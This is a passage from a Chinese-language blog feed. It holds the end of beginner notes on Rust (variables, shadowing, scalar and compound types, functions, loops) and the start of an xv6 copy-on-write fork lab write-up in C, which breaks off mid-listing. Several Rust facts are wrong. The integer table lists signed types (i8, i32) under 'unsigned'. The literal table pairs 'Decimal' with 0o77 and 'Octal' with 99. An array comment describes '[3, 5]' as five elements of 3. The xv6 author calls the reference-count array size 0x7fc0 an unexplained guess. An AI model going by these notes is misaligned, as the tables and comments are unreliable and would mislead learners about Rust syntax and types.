class="number">5</span>;</span><br><span class="line">    <span class="comment">// 添加 mut 后，允许 x 的值改变</span></span><br><span class="line">    <span class="comment">// let mut x = 5;</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常量-const"><a href="#常量-const" class="headerlink" title="常量 const"></a>常量 const</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;const_name&#125;: &#123;const_type&#125; = &#123;const_value&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PI: <span class="type">f32</span> = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>必须注明常量类型</p><h3 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h3><p>一个变量名可以重复声明，便于在类型转换等情况时复用变量名，实际上是创建了一个新变量，之前的变量会被隐藏，直到新变量的作用域结束</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-5&quot;</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Not a number&quot;</span>);</span><br><span class="line">        x = x + <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// x = 0</span></span><br><span class="line"><span class="comment">// x = -5</span></span><br></pre></td></tr></table></figure><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Rust 有标量和复合两类数据类型</p><h3 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h3><h4 id="整型-integer"><a href="#整型-integer" class="headerlink" title="整型 integer"></a>整型 integer</h4><table><thead><tr><th>Len</th><th>signed</th><th>unsigned</th></tr></thead><tbody><tr><td>8-bit</td><td>i8</td><td>i8</td></tr><tr><td>32-bit</td><td>i32</td><td>i32</td></tr><tr><td>64-bit</td><td>i64</td><td>i64</td></tr><tr><td>128-bit</td><td>i128</td><td>i128</td></tr><tr><td>arch</td><td>isize</td><td>isize</td></tr><tr><td>Rust 默认类型为 <code>i32</code></td><td></td><td></td></tr></tbody></table><p>arch 依赖计算机架构，64 位架构 <code>isize</code> 就是 64 位</p><p>数字可使用 <code>_</code> 作为分隔符，方便读数，如 <code>1000</code> 表示为 <code>1_000</code> </p><p>也可以使用类型后缀来指定数字类型，如 <code>57u8</code> 为无符号 8-bit 整型</p><table><thead><tr><th>字面值</th><th>例子</th></tr></thead><tbody><tr><td>Hex</td><td>0xff</td></tr><tr><td>Decimal</td><td>0o77</td></tr><tr><td>Octal</td><td>99</td></tr><tr><td>Binary</td><td>0b11</td></tr><tr><td>Byte</td><td>b’a’</td></tr></tbody></table><h4 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型 float"></a>浮点型 float</h4><p>Rust 浮点数类型有 <code>f32</code> 和 <code>f64</code>，默认为 <code>f64</code> 类型，精度更高</p><h4 id="布尔型-bool"><a href="#布尔型-bool" class="headerlink" title="布尔型 bool"></a>布尔型 bool</h4><p><code>true</code> 和 <code>false</code> 两个值</p><h4 id="字符型-char"><a href="#字符型-char" class="headerlink" title="字符型 char"></a>字符型 char</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">c</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">heart_eyed_cat</span>: <span class="type">char</span> = &#x27;😻&#x27;;</span><br></pre></td></tr></table></figure><p>这里的 <code>char</code> 大小是四个字节，Unicode 编码，可以表示比 ASCII 更多的内容，如中日韩文、emoji 等</p><p>字符型的值必须使用单引号表示，双引号为字符串</p><h3 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h3><h4 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组 tuple"></a>元组 tuple</h4><p>元组可以将多个类型的值组合进一个复合类型，长度不可变，类似 C 语言的结构体</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>类型可省略，省略后为默认类型</p><p>从元组上取值</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解构，destructuring</span></span><br><span class="line"><span class="keyword">let</span> (x, y, z) = tup;</span><br><span class="line"><span class="comment">// 索引</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = tup.<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = tup.<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">z</span> = tup.<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>不带任何值的元组，称为单元元组</p><h4 id="数组-array"><a href="#数组-array" class="headerlink" title="数组 array"></a>数组 array</h4><p>数组的元素类型必须相同，长度固定</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// 长度为 4，元素类型为 i32 的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: [<span class="type">i32</span>; <span class="number">4</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// 长度为 5，元素全为 3 的数组</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素访问</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">first</span> = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>越界访问会直接导致 panic，这是 Rust 的一个安全机制</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>使用 <code>fn</code> 关键字声明函数，函数名和变量名使用 <code>snake case</code> 规范风格，字母全部小写</p><p>Rust 不像 C 语言需要在 调用函数 的前面声明 被调用函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> &#123;func_name&#125; (&#123;var_name1&#125;: &#123;var_type1&#125;, ..) <span class="punctuation">-&gt;</span> &#123;ret_type&#125;&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;x&#125; + &#123;y&#125; = &#123;&#125;&quot;</span>, <span class="title function_ invoke__">my_func</span>(x, y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须指定参数类型</p><h3 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h3><p>Rust 是<strong>基于表达式</strong>的语言</p><p>表达式：计算并产生一个值。大部分 Rust 代码由表达式组成，数学运算、函数调用、宏调用、大括号创建的块作用于都是一个表达式</p><p>语句：执行一些操作但不返回值的指令。当表达式结尾加上分号时，它就变成了语句。函数定义也是一个语句</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">    x + <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;y&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: </span></span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure><p>这里的代码块 <code>&#123;let x = 3; x + 1&#125;</code> 由于结尾没有分号，是一个表达式，返回值是 4</p><p>在有返回值的函数中可以主动使用 <code>return</code> 返回值，也可以隐式地返回函数中最后的表达式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在返回表达式时，结尾不可加分号，否则它就不是表达式了</p><h2 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h2><p>Rust 中控制流的表达式必须返回 bool 类型</p><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>let</code> 语句中使用 if-else</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">condition</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;The value of number is: &#123;number&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="loop、while、for"><a href="#loop、while、for" class="headerlink" title="loop、while、for"></a>loop、while、for</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无限循环</span></span><br><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两种遍历数组的方式</span></span><br><span class="line"><span class="keyword">while</span> i &lt; a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0..a.len() 相当于 Python 的 range(0, len(a))</span></span><br><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>break、continue</strong></p><p>简单的 <code>break</code>、<code>continue</code> 可以跳出一层循环</p><p><code>break</code>、<code>continue</code> 后加上表达式，可以返回值</p><p>想要跳出嵌套循环，在指定循环前标记一个<strong>循环标签</strong>，与 <code>break</code> 或 <code>continue</code> 一起使用，可以作用于标记的循环，<code>循环标签</code>前需要加单引号 <code>&#39;</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res = 20</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">res</span> = <span class="keyword">loop</span> &#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套循环</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"><span class="symbol">&#x27;counting_up</span>: <span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;count = &#123;count&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">remaining</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;remaining = &#123;remaining&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> remaining == <span class="number">9</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> <span class="symbol">&#x27;counting_up</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        remaining -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;End count = &#123;count&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;仅仅介绍 Rust 的安装、Cargo、变量、数据类型、函数和控制流&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Rust" scheme="https://humoooor.cn/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Lab5 Copy-on-write fork</title>
    <link href="https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/"/>
    <id>https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/</id>
    <published>2022-11-12T01:25:00.000Z</published>
    <updated>2023-05-23T03:22:49.245Z</updated>
    
    <content type="html"><![CDATA[<p>页表牛逼</p><span id="more"></span><h2 id="实现-Copy-on-write-fork"><a href="#实现-Copy-on-write-fork" class="headerlink" title="实现 Copy-on-write fork"></a>实现 Copy-on-write fork</h2><ol><li>添加宏定义 PTE_COW，使用 PTE 的 RSW 最低有效位，来标识是否是 COW 页，只用于可写页</li></ol><figure class="highlight c"><figcaption><span>kernel/riscv.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COW (1L &lt;&lt; 8)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>添加 reference count 标识一个物理页面被几个用户页表指向，初始化，增减</li></ol><p>提示使用 kenel/kalloc.c 里 <code>kinit()</code> 里 <code>freerange()</code> 的范围，通过调试 end = 0x80041c50，PHYSTOP = 0x88000000，相减除以 4096 得 0x7fbe</p><p>但是在 make qemu 时，过 <code>usertests -q</code> 时，最后会显示丢失一些页，但是 make CPUS=1 qemu-gdb 时又显示通过，可能子啊多核时会出现一些问题，很怪</p><p>将 0x7fbe 改为 0x7fc0 就没有问题，不是很懂，如果有了解的师傅可以告诉我🐎</p><p>笔者把它放到 kmem 里，增减时用 kmem.lock 锁</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">  uint refers[<span class="number">0x7fc0</span>];</span><br><span class="line">&#125; kmem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kinit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kmem.refers) / <span class="keyword">sizeof</span>(kmem.refers[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">    kmem.refers[i]++;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  freerange(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  krefDecre(pa);</span><br><span class="line">  <span class="keyword">if</span>(!kref(pa)) &#123;</span><br><span class="line">    <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">    krefIncre((<span class="type">void</span>*)r);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint</span><br><span class="line"><span class="title function_">kref</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefIncre</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]++;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefDecre</span><span class="params">(<span class="type">void</span> *pa)</span> &#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]--;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 <code>uvmcopy</code>，在复制时将子进程页表直接指向父进程页表对应的物理地址</li></ol><p>因为在调用 <code>fork</code> 时，复制内存就是直接调用 <code>uvmcopy</code>，修改这个就行</p><p>当遇到可写的页时，取消 PTE_W，添加 PTE_COW</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span 